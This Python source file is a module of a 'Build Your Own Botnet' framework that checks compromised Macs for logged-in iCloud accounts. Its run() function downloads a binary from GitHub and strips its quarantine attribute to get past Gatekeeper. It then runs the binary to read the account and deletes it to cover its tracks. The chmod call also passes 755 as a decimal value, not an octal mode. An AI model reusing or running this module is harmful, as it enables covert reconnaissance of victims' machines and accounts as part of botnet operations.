#!/usr/bin/python
# -*- coding: utf-8 -*-
'iCloud (Build Your Own Botnet)'

# standard library
import os
import urllib
import subprocess

# utilities
import util

# globals
packages = []
platforms = ['darwin']
command = True
usage = 'icloud'
description = """
Check for logged in iCloud accounts on macOS
"""

# main
def run():
    """
    Check for logged in iCloud account on macOS
    """
    filename, _ = urllib.urlretrieve("https://github.com/mas-cli/mas/releases/download/v1.4.2/mas-cli.zip")
    util.unzip(filename)
    mas = os.path.join(os.path.dirname(filename), 'mas')
    subprocess.Popen(['xattr','-r','-d','com.apple.quarantine',mas], 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE)
    os.chmod(mas, 755)
    result = subprocess.check_output([mas, "account"]).rstrip()
    util.delete(mas)
    return result
